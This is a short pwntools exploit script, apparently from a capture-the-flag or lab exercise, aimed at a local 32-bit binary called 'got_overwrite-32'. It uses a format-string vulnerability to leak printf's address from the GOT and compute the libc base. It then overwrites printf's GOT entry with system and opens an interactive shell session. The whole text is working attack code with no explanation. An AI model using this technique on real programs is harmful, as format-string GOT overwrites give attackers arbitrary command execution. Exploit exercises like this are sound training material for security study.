

from pwn import *

elf = context.binary = ELF("./got_overwrite-32")

p = process()
payload = flat([
    "%6$s",
    elf.got["printf"]
])
p.sendline(payload)


printf_leak = u32(p.recv(4))

libc = elf.libc
libc.address = printf_leak - libc.sym["printf"] 

payload = fmtstr_payload(5,{elf.got["printf"]: libc.sym["system"]})
p.sendline(payload)





p.interactive()
